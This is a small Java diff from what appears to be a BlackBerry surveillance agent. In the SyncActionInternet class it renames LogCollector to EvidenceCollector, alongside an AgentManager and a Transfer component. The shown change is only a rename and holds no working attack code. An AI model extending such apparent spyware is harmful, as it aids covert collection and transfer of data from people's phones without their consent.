@@ -21,7 +21,7 @@ import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
-import blackberry.log.LogCollector;
+import blackberry.evidence.EvidenceCollector;
 import blackberry.transfer.Transfer;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
@@ -36,7 +36,7 @@ public class SyncActionInternet extends SubAction {
     private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);
     //#endif
 
-    LogCollector logCollector;
+    EvidenceCollector logCollector;
     AgentManager agentManager;
     Transfer transfer;
 
@@ -66,7 +66,7 @@ public class SyncActionInternet extends SubAction {
         Check.requires(actionId == ACTION_SYNC_INTERNET, "Wrong ActionId");
         //#endif
 
-        logCollector = LogCollector.getInstance();
+        logCollector = EvidenceCollector.getInstance();
         agentManager = AgentManager.getInstance();
         transfer = Transfer.getInstance();
     }
